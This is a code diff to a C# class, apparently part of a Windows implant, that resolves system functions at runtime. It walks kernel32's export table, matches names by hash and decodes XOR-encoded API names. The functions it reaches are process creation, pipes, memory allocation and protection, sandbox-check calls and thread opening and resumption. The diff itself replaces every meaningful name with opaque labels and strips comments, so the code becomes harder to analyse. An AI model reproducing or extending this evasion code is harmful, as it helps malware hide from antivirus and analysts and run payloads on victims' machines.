@@ -5,26 +5,23 @@ using System.Text;
 
 namespace SvcUtil
 {
-    internal static class DynInvoke
+    internal static class W
     {
-        // ── Bootstrap delegate types ────────────────────────────────
+        // ── Bootstrap ───────────────────────────────────────────────
 
         [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true, CharSet = CharSet.Ansi)]
-        private delegate IntPtr DLoadLibraryA(string lpFileName);
+        private delegate IntPtr Fa(string n);
 
         [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true, CharSet = CharSet.Ansi)]
-        private delegate IntPtr DGetProcAddress(IntPtr hModule, string lpProcName);
+        private delegate IntPtr Fb(IntPtr h, string n);
 
-        private static DLoadLibraryA _loadLibraryA;
-        private static DGetProcAddress _getProcAddress;
+        private static Fa _fa;
+        private static Fb _fb;
 
-        // djb2 hash constants for bootstrap APIs
-        private const uint H_GPA = 0xAADFAB0B; // GetProcAddress
-        private const uint H_LLA = 0x01ED9ADD; // LoadLibraryA
+        private const uint H_GPA = 0xAADFAB0B;
+        private const uint H_LLA = 0x01ED9ADD;
 
-        // ── EAT Walking Bootstrap ───────────────────────────────────
-
-        private static IntPtr FindKernel32Base()
+        private static IntPtr BM()
         {
             var modules = Process.GetCurrentProcess().Modules;
             string target = D(_k32);
@@ -37,70 +34,60 @@ namespace SvcUtil
             return IntPtr.Zero;
         }
 
-        private static uint Djb2(IntPtr strPtr)
+        private static uint Hv(IntPtr p)
         {
             uint h = 5381;
             int off = 0;
             byte b;
-            while ((b = Marshal.ReadByte(strPtr, off++)) != 0)
+            while ((b = Marshal.ReadByte(p, off++)) != 0)
                 h = ((h << 5) + h) ^ b;
             return h;
         }
 
-        private static IntPtr ResolveExport(IntPtr modBase, uint targetHash)
+        private static IntPtr RX(IntPtr mb, uint th)
         {
-            int e_lfanew = Marshal.ReadInt32(modBase, 0x3C);
-            IntPtr peHdr = (IntPtr)(modBase.ToInt64() + e_lfanew);
-
-            // PE32 (0x10B) vs PE32+ (0x20B) — export dir offset differs
-            short magic = Marshal.ReadInt16(peHdr, 0x18);
-            int exportRva = Marshal.ReadInt32(peHdr, magic == 0x20B ? 0x88 : 0x78);
-            if (exportRva == 0) return IntPtr.Zero;
-
-            IntPtr exportDir = (IntPtr)(modBase.ToInt64() + exportRva);
-            int numNames   = Marshal.ReadInt32(exportDir, 0x18);
-            int rvaFuncs   = Marshal.ReadInt32(exportDir, 0x1C);
-            int rvaNames   = Marshal.ReadInt32(exportDir, 0x20);
-            int rvaOrds    = Marshal.ReadInt32(exportDir, 0x24);
-
-            for (int i = 0; i < numNames; i++)
+            int e_lfanew = Marshal.ReadInt32(mb, 0x3C);
+            IntPtr pe = (IntPtr)(mb.ToInt64() + e_lfanew);
+            short magic = Marshal.ReadInt16(pe, 0x18);
+            int exRva = Marshal.ReadInt32(pe, magic == 0x20B ? 0x88 : 0x78);
+            if (exRva == 0) return IntPtr.Zero;
+            IntPtr ed = (IntPtr)(mb.ToInt64() + exRva);
+            int nn = Marshal.ReadInt32(ed, 0x18);
+            int rf = Marshal.ReadInt32(ed, 0x1C);
+            int rn = Marshal.ReadInt32(ed, 0x20);
+            int ro = Marshal.ReadInt32(ed, 0x24);
+            for (int i = 0; i < nn; i++)
             {
-                int nameRva = Marshal.ReadInt32(
-                    (IntPtr)(modBase.ToInt64() + rvaNames), i * 4);
-                IntPtr namePtr = (IntPtr)(modBase.ToInt64() + nameRva);
-
-                if (Djb2(namePtr) == targetHash)
+                int nrva = Marshal.ReadInt32(
+                    (IntPtr)(mb.ToInt64() + rn), i * 4);
+                IntPtr np = (IntPtr)(mb.ToInt64() + nrva);
+                if (Hv(np) == th)
                 {
                     short ord = Marshal.ReadInt16(
-                        (IntPtr)(modBase.ToInt64() + rvaOrds), i * 2);
-                    int funcRva = Marshal.ReadInt32(
-                        (IntPtr)(modBase.ToInt64() + rvaFuncs), ord * 4);
-                    return (IntPtr)(modBase.ToInt64() + funcRva);
+                        (IntPtr)(mb.ToInt64() + ro), i * 2);
+                    int frva = Marshal.ReadInt32(
+                        (IntPtr)(mb.ToInt64() + rf), ord * 4);
+                    return (IntPtr)(mb.ToInt64() + frva);
                 }
             }
             return IntPtr.Zero;
         }
 
-        private static void EnsureBootstrap()
+        private static void EB()
         {
-            if (_loadLibraryA != null) return;
-
-            IntPtr k32 = FindKernel32Base();
-            if (k32 == IntPtr.Zero)
+            if (_fa != null) return;
+            IntPtr k = BM();
+            if (k == IntPtr.Zero) throw new EntryPointNotFoundException();
+            IntPtr pg = RX(k, H_GPA);
+            IntPtr pl = RX(k, H_LLA);
+            if (pg == IntPtr.Zero || pl == IntPtr.Zero)
                 throw new EntryPointNotFoundException();
-
-            IntPtr pGpa = ResolveExport(k32, H_GPA);
-            IntPtr pLla = ResolveExport(k32, H_LLA);
-            if (pGpa == IntPtr.Zero || pLla == IntPtr.Zero)
-                throw new EntryPointNotFoundException();
-
-            _getProcAddress = (DGetProcAddress)Marshal.GetDelegateForFunctionPointer(
-                pGpa, typeof(DGetProcAddress));
-            _loadLibraryA = (DLoadLibraryA)Marshal.GetDelegateForFunctionPointer(
-                pLla, typeof(DLoadLibraryA));
+            _fb = (Fb)Marshal.GetDelegateForFunctionPointer(pg, typeof(Fb));
+            _fa = (Fa)Marshal.GetDelegateForFunctionPointer(pl, typeof(Fa));
         }
 
         // ── String decode ───────────────────────────────────────────
+
         private static readonly byte[] _xk = { 0x71, 0x58, 0x2D, 0x93, 0xA4 };
 
         private static string D(byte[] c)
@@ -111,7 +98,6 @@ namespace SvcUtil
             return Encoding.UTF8.GetString(b);
         }
 
-        // Pre-computed encoded strings
         private static readonly byte[] _k32 = { 0x1A, 0x3D, 0x5F, 0xFD, 0xC1, 0x1D, 0x6B, 0x1F, 0xBD, 0xC0, 0x1D, 0x34 };
         private static readonly byte[] _s00 = { 0x32, 0x2A, 0x48, 0xF2, 0xD0, 0x14, 0x08, 0x5F, 0xFC, 0xC7, 0x14, 0x2B, 0x5E, 0xC4 };
         private static readonly byte[] _s01 = { 0x32, 0x2A, 0x48, 0xF2, 0xD0, 0x14, 0x08, 0x44, 0xE3, 0xC1 };
@@ -133,344 +119,329 @@ namespace SvcUtil
         private static readonly byte[] _s17 = { 0x25, 0x30, 0x5F, 0xF6, 0xC5, 0x15, 0x6B, 0x1F, 0xD5, 0xCD, 0x03, 0x2B, 0x59 };
         private static readonly byte[] _s18 = { 0x25, 0x30, 0x5F, 0xF6, 0xC5, 0x15, 0x6B, 0x1F, 0xDD, 0xC1, 0x09, 0x2C };
         private static readonly byte[] _s19 = { 0x3E, 0x28, 0x48, 0xFD, 0xF0, 0x19, 0x2A, 0x48, 0xF2, 0xC0 };
-
-        private static IntPtr _hKernel32 = IntPtr.Zero;
-
-        private static IntPtr Kernel32
-        {
-            get
-            {
-                if (_hKernel32 == IntPtr.Zero)
-                {
-                    EnsureBootstrap();
-                    _hKernel32 = _loadLibraryA(D(_k32));
-                }
-                return _hKernel32;
-            }
-        }
-
-        private static Delegate GetFunc(byte[] enc, Type delegateType)
-        {
-            EnsureBootstrap();
-            IntPtr addr = _getProcAddress(Kernel32, D(enc));
-            if (addr == IntPtr.Zero)
-                throw new EntryPointNotFoundException();
-            return Marshal.GetDelegateForFunctionPointer(addr, delegateType);
-        }
-
-        // ── Delegate signatures ──────────────────────────────────────
-
-        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true, CharSet = CharSet.Unicode)]
-        public delegate bool DCreateProcessW(
-            string lpApplicationName, string lpCommandLine,
-            IntPtr lpProcessAttributes, IntPtr lpThreadAttributes,
-            bool bInheritHandles, uint dwCreationFlags,
-            IntPtr lpEnvironment, string lpCurrentDirectory,
-            ref Shell.STARTUPINFO lpStartupInfo,
-            out Shell.PROCESS_INFORMATION lpProcessInformation);
-
-        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
-        public delegate bool DCreatePipe(
-            ref IntPtr hReadPipe, ref IntPtr hWritePipe,
-            IntPtr lpPipeAttributes, int nSize);
-
-        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
-        public delegate bool DCloseHandle(IntPtr handle);
-
-        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
-        public delegate bool DDuplicateHandle(
-            IntPtr hSourceProcess, IntPtr hSource,
-            IntPtr hTargetProcess, ref IntPtr hTarget,
-            int dwDesiredAccess, bool bInheritHandle, int dwOptions);
-
-        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
-        public delegate IntPtr DGetCurrentProcess();
-
-        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
-        public delegate bool DPeekNamedPipe(
-            IntPtr hNamedPipe, byte[] lpBuffer, int nBufferSize,
-            out int lpBytesRead, out int lpTotalBytesAvail,
-            IntPtr lpBytesLeftThisMessage);
-
-        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
-        public delegate bool DReadFile(
-            IntPtr hFile, byte[] lpBuffer, int nNumberOfBytesToRead,
-            out int lpNumberOfBytesRead, IntPtr lpOverlapped);
-
-        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
-        public delegate bool DWriteFile(
-            IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite,
-            out int lpNumberOfBytesWritten, IntPtr lpOverlapped);
-
-        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
-        public delegate int DWaitForSingleObject(IntPtr hHandle, int dwMilliseconds);
-
-        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
-        public delegate bool DVirtualProtect(
-            IntPtr lpAddress, UIntPtr dwSize,
-            uint flNewProtect, out uint lpflOldProtect);
-
-        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
-        public delegate IntPtr DVirtualAlloc(
-            IntPtr lpAddress, UIntPtr dwSize,
-            uint flAllocationType, uint flProtect);
-
-        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
-        public delegate bool DVirtualFree(
-            IntPtr lpAddress, UIntPtr dwSize, uint dwFreeType);
-
-        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
-        public delegate IntPtr DVirtualAllocExNuma(
-            IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize,
-            uint flAllocationType, uint flProtect, uint nndPreferred);
-
-        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
-        public delegate uint DFlsAlloc(IntPtr callback);
-
-        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
-        public delegate bool DFlsFree(uint dwFlsIndex);
-
-        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        public delegate ulong DGetTickCount64();
-
-        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
-        public delegate IntPtr DCreateToolhelp32Snapshot(
-            uint dwFlags, uint th32ProcessID);
-
-        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
-        public delegate bool DThread32First(IntPtr hSnapshot, IntPtr lpte);
-
-        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
-        public delegate bool DThread32Next(IntPtr hSnapshot, IntPtr lpte);
-
-        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
-        public delegate IntPtr DOpenThread(
-            uint dwDesiredAccess, bool bInheritHandle, uint dwThreadId);
-
-        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
-        public delegate uint DResumeThread(IntPtr hThread);
-
-        // ── Cached instances ─────────────────────────────────────────
-
-        private static DCreateProcessW _createProcessW;
-        private static DCreatePipe _createPipe;
-        private static DCloseHandle _closeHandle;
-        private static DDuplicateHandle _duplicateHandle;
-        private static DGetCurrentProcess _getCurrentProcess;
-        private static DPeekNamedPipe _peekNamedPipe;
-        private static DReadFile _readFile;
-        private static DWriteFile _writeFile;
-        private static DWaitForSingleObject _waitForSingleObject;
-        private static DVirtualProtect _virtualProtect;
-        private static DVirtualAlloc _virtualAlloc;
-        private static DVirtualFree _virtualFree;
-        private static DVirtualAllocExNuma _virtualAllocExNuma;
-        private static DFlsAlloc _flsAlloc;
-        private static DFlsFree _flsFree;
-        private static DGetTickCount64 _getTickCount64;
-        private static DCreateToolhelp32Snapshot _createToolhelp32Snapshot;
-        private static DThread32First _thread32First;
-        private static DThread32Next _thread32Next;
-        private static DOpenThread _openThread;
-        private static DResumeThread _resumeThread;
         private static readonly byte[] _s20 = { 0x23, 0x3D, 0x5E, 0xE6, 0xC9, 0x14, 0x0C, 0x45, 0xE1, 0xC1, 0x10, 0x3C };
 
-        // ── Public wrappers for external module resolution ───────────
+        // ── Module handle ───────────────────────────────────────────
 
-        public static IntPtr LoadLib(string dllName)
-        {
-            EnsureBootstrap();
-            return _loadLibraryA(dllName);
-        }
+        private static IntPtr _hK = IntPtr.Zero;
 
-        public static IntPtr GetProc(IntPtr hModule, string procName)
-        {
-            EnsureBootstrap();
-            return _getProcAddress(hModule, procName);
-        }
-
-        // ── Public accessors (runtime resolved) ─────────────────────
-
-        public static DCreateProcessW CreateProcessW
+        private static IntPtr K
         {
             get
             {
-                if (_createProcessW == null)
-                    _createProcessW = (DCreateProcessW)GetFunc(_s00, typeof(DCreateProcessW));
-                return _createProcessW;
+                if (_hK == IntPtr.Zero)
+                {
+                    EB();
+                    _hK = _fa(D(_k32));
+                }
+                return _hK;
             }
         }
 
-        public static DCreatePipe CreatePipe
+        private static Delegate GF(byte[] enc, Type dt)
+        {
+            EB();
+            IntPtr addr = _fb(K, D(enc));
+            if (addr == IntPtr.Zero)
+                throw new EntryPointNotFoundException();
+            return Marshal.GetDelegateForFunctionPointer(addr, dt);
+        }
+
+        // ── Delegate signatures ─────────────────────────────────────
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true, CharSet = CharSet.Unicode)]
+        public delegate bool T00(
+            string a, string b, IntPtr c, IntPtr d,
+            bool e, uint f, IntPtr g, string h,
+            ref Shell.STARTUPINFO si, out Shell.PROCESS_INFORMATION pi);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
+        public delegate bool T01(
+            ref IntPtr a, ref IntPtr b, IntPtr c, int d);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
+        public delegate bool T02(IntPtr h);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
+        public delegate bool T03(
+            IntPtr a, IntPtr b, IntPtr c, ref IntPtr d,
+            int e, bool f, int g);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
+        public delegate IntPtr T04();
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
+        public delegate bool T05(
+            IntPtr a, byte[] b, int c,
+            out int d, out int e, IntPtr f);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
+        public delegate bool T06(
+            IntPtr a, byte[] b, int c,
+            out int d, IntPtr e);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
+        public delegate bool T07(
+            IntPtr a, byte[] b, uint c,
+            out int d, IntPtr e);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
+        public delegate int T08(IntPtr a, int b);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
+        public delegate bool T09(
+            IntPtr a, UIntPtr b, uint c, out uint d);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
+        public delegate IntPtr T10(
+            IntPtr a, UIntPtr b, uint c, uint d);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
+        public delegate bool T11(IntPtr a, UIntPtr b, uint c);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
+        public delegate IntPtr T12(
+            IntPtr a, IntPtr b, UIntPtr c,
+            uint d, uint e, uint f);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
+        public delegate uint T13(IntPtr a);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
+        public delegate bool T14(uint a);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate ulong T15();
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
+        public delegate IntPtr T16(uint a, uint b);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
+        public delegate bool T17(IntPtr a, IntPtr b);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
+        public delegate bool T18(IntPtr a, IntPtr b);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
+        public delegate IntPtr T19(uint a, bool b, uint c);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
+        public delegate uint T20(IntPtr a);
+
+        // ── Cached instances ────────────────────────────────────────
+
+        private static T00 _f00;
+        private static T01 _f01;
+        private static T02 _f02;
+        private static T03 _f03;
+        private static T04 _f04;
+        private static T05 _f05;
+        private static T06 _f06;
+        private static T07 _f07;
+        private static T08 _f08;
+        private static T09 _f09;
+        private static T10 _f10;
+        private static T11 _f11;
+        private static T12 _f12;
+        private static T13 _f13;
+        private static T14 _f14;
+        private static T15 _f15;
+        private static T16 _f16;
+        private static T17 _f17;
+        private static T18 _f18;
+        private static T19 _f19;
+        private static T20 _f20;
+
+        // ── Public wrappers ─────────────────────────────────────────
+
+        public static IntPtr M0(string n)
+        {
+            EB();
+            return _fa(n);
+        }
+
+        public static IntPtr M1(IntPtr h, string n)
+        {
+            EB();
+            return _fb(h, n);
+        }
+
+        public static T00 M2
         {
             get
             {
-                if (_createPipe == null)
-                    _createPipe = (DCreatePipe)GetFunc(_s01, typeof(DCreatePipe));
-                return _createPipe;
+                if (_f00 == null)
+                    _f00 = (T00)GF(_s00, typeof(T00));
+                return _f00;
             }
         }
 
-        public static DCloseHandle CloseHandle
+        public static T01 M3
         {
             get
             {
-                if (_closeHandle == null)
-                    _closeHandle = (DCloseHandle)GetFunc(_s02, typeof(DCloseHandle));
-                return _closeHandle;
+                if (_f01 == null)
+                    _f01 = (T01)GF(_s01, typeof(T01));
+                return _f01;
             }
         }
 
-        public static DDuplicateHandle DuplicateHandle
+        public static T02 M4
         {
             get
             {
-                if (_duplicateHandle == null)
-                    _duplicateHandle = (DDuplicateHandle)GetFunc(_s03, typeof(DDuplicateHandle));
-                return _duplicateHandle;
+                if (_f02 == null)
+                    _f02 = (T02)GF(_s02, typeof(T02));
+                return _f02;
             }
         }
 
-        public static DGetCurrentProcess GetCurrentProcess
+        public static T03 M5
         {
             get
             {
-                if (_getCurrentProcess == null)
-                    _getCurrentProcess = (DGetCurrentProcess)GetFunc(_s04, typeof(DGetCurrentProcess));
-                return _getCurrentProcess;
+                if (_f03 == null)
+                    _f03 = (T03)GF(_s03, typeof(T03));
+                return _f03;
             }
         }
 
-        public static DPeekNamedPipe PeekNamedPipe
+        public static T04 M6
         {
             get
             {
-                if (_peekNamedPipe == null)
-                    _peekNamedPipe = (DPeekNamedPipe)GetFunc(_s05, typeof(DPeekNamedPipe));
-                return _peekNamedPipe;
+                if (_f04 == null)
+                    _f04 = (T04)GF(_s04, typeof(T04));
+                return _f04;
             }
         }
 
-        public static DReadFile ReadFile
+        public static T05 M7
         {
             get
             {
-                if (_readFile == null)
-                    _readFile = (DReadFile)GetFunc(_s06, typeof(DReadFile));
-                return _readFile;
+                if (_f05 == null)
+                    _f05 = (T05)GF(_s05, typeof(T05));
+                return _f05;
             }
         }
 
-        public static DWriteFile WriteFile
+        public static T06 M8
         {
             get
             {
-                if (_writeFile == null)
-                    _writeFile = (DWriteFile)GetFunc(_s07, typeof(DWriteFile));
-                return _writeFile;
+                if (_f06 == null)
+                    _f06 = (T06)GF(_s06, typeof(T06));
+                return _f06;
             }
         }
 
-        public static DWaitForSingleObject WaitForSingleObject
+        public static T07 M9
         {
             get
             {
-                if (_waitForSingleObject == null)
-                    _waitForSingleObject = (DWaitForSingleObject)GetFunc(_s08, typeof(DWaitForSingleObject));
-                return _waitForSingleObject;
+                if (_f07 == null)
+                    _f07 = (T07)GF(_s07, typeof(T07));
+                return _f07;
             }
         }
 
-        public static DVirtualProtect VirtualProtect
+        public static T08 MA
         {
             get
             {
-                if (_virtualProtect == null)
-                    _virtualProtect = (DVirtualProtect)GetFunc(_s09, typeof(DVirtualProtect));
-                return _virtualProtect;
+                if (_f08 == null)
+                    _f08 = (T08)GF(_s08, typeof(T08));
+                return _f08;
             }
         }
 
-        public static IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize,
-            uint flAllocationType, uint flProtect)
+        public static T09 MB
         {
-            if (_virtualAlloc == null)
-                _virtualAlloc = (DVirtualAlloc)GetFunc(_s10, typeof(DVirtualAlloc));
-            return _virtualAlloc(lpAddress, dwSize, flAllocationType, flProtect);
+            get
+            {
+                if (_f09 == null)
+                    _f09 = (T09)GF(_s09, typeof(T09));
+                return _f09;
+            }
         }
 
-        public static bool VirtualFree(IntPtr lpAddress, UIntPtr dwSize,
-            uint dwFreeType)
+        public static IntPtr MC(IntPtr a, UIntPtr b, uint c, uint d)
         {
-            if (_virtualFree == null)
-                _virtualFree = (DVirtualFree)GetFunc(_s11, typeof(DVirtualFree));
-            return _virtualFree(lpAddress, dwSize, dwFreeType);
+            if (_f10 == null)
+                _f10 = (T10)GF(_s10, typeof(T10));
+            return _f10(a, b, c, d);
         }
 
-        public static IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress,
-            UIntPtr dwSize, uint flAllocationType, uint flProtect,
-            uint nndPreferred)
+        public static bool MD(IntPtr a, UIntPtr b, uint c)
         {
-            if (_virtualAllocExNuma == null)
-                _virtualAllocExNuma = (DVirtualAllocExNuma)GetFunc(_s12, typeof(DVirtualAllocExNuma));
-            return _virtualAllocExNuma(hProcess, lpAddress, dwSize, flAllocationType, flProtect, nndPreferred);
+            if (_f11 == null)
+                _f11 = (T11)GF(_s11, typeof(T11));
+            return _f11(a, b, c);
         }
 
-        public static uint FlsAlloc(IntPtr callback)
+        public static IntPtr ME(IntPtr a, IntPtr b, UIntPtr c,
+            uint d, uint e, uint f)
         {
-            if (_flsAlloc == null)
-                _flsAlloc = (DFlsAlloc)GetFunc(_s13, typeof(DFlsAlloc));
-            return _flsAlloc(callback);
+            if (_f12 == null)
+                _f12 = (T12)GF(_s12, typeof(T12));
+            return _f12(a, b, c, d, e, f);
         }
 
-        public static bool FlsFree(uint dwFlsIndex)
+        public static uint MF(IntPtr a)
         {
-            if (_flsFree == null)
-                _flsFree = (DFlsFree)GetFunc(_s14, typeof(DFlsFree));
-            return _flsFree(dwFlsIndex);
+            if (_f13 == null)
+                _f13 = (T13)GF(_s13, typeof(T13));
+            return _f13(a);
         }
 
-        public static ulong GetTickCount64()
+        public static bool MG(uint a)
         {
-            if (_getTickCount64 == null)
-                _getTickCount64 = (DGetTickCount64)GetFunc(_s15, typeof(DGetTickCount64));
-            return _getTickCount64();
+            if (_f14 == null)
+                _f14 = (T14)GF(_s14, typeof(T14));
+            return _f14(a);
         }
 
-        public static IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID)
+        public static ulong MH()
         {
-            if (_createToolhelp32Snapshot == null)
-                _createToolhelp32Snapshot = (DCreateToolhelp32Snapshot)GetFunc(_s16, typeof(DCreateToolhelp32Snapshot));
-            return _createToolhelp32Snapshot(dwFlags, th32ProcessID);
+            if (_f15 == null)
+                _f15 = (T15)GF(_s15, typeof(T15));
+            return _f15();
         }
 
-        public static bool Thread32First(IntPtr hSnapshot, IntPtr lpte)
+        public static IntPtr MI(uint a, uint b)
         {
-            if (_thread32First == null)
-                _thread32First = (DThread32First)GetFunc(_s17, typeof(DThread32First));
-            return _thread32First(hSnapshot, lpte);
+            if (_f16 == null)
+                _f16 = (T16)GF(_s16, typeof(T16));
+            return _f16(a, b);
         }
 
-        public static bool Thread32Next(IntPtr hSnapshot, IntPtr lpte)
+        public static bool MJ(IntPtr a, IntPtr b)
         {
-            if (_thread32Next == null)
-                _thread32Next = (DThread32Next)GetFunc(_s18, typeof(DThread32Next));
-            return _thread32Next(hSnapshot, lpte);
+            if (_f17 == null)
+                _f17 = (T17)GF(_s17, typeof(T17));
+            return _f17(a, b);
         }
 
-        public static IntPtr OpenThread(uint dwDesiredAccess, bool bInheritHandle,
-            uint dwThreadId)
+        public static bool MK(IntPtr a, IntPtr b)
         {
-            if (_openThread == null)
-                _openThread = (DOpenThread)GetFunc(_s19, typeof(DOpenThread));
-            return _openThread(dwDesiredAccess, bInheritHandle, dwThreadId);
+            if (_f18 == null)
+                _f18 = (T18)GF(_s18, typeof(T18));
+            return _f18(a, b);
         }
 
-        public static uint ResumeThread(IntPtr hThread)
+        public static IntPtr ML(uint a, bool b, uint c)
         {
-            if (_resumeThread == null)
-                _resumeThread = (DResumeThread)GetFunc(_s20, typeof(DResumeThread));
-            return _resumeThread(hThread);
+            if (_f19 == null)
+                _f19 = (T19)GF(_s19, typeof(T19));
+            return _f19(a, b, c);
+        }
+
+        public static uint MM(IntPtr a)
+        {
+            if (_f20 == null)
+                _f20 = (T20)GF(_s20, typeof(T20));
+            return _f20(a);
         }
     }
 }
